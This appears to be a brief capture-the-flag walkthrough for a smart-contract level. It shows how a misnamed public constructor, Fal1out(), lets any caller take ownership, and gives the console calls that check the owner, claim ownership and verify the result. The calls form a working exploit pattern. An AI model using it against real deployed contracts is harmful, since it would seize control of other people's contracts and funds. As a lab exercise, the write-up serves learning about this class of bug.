- Checked the owner of the contract

`
await contract.owner();
`

- It returned an address containing zeroes which meant that no one was the owner

- Understood that Fal1out() was just a public function

- As Fal1out() was just a public function, we can pass the ownership to ourself

`
await contract.Fal1out({ from: player });
`

-Verfied the ownership by 

`
await contract.owner();
`

- It returned the player address

- Submitted the instance 
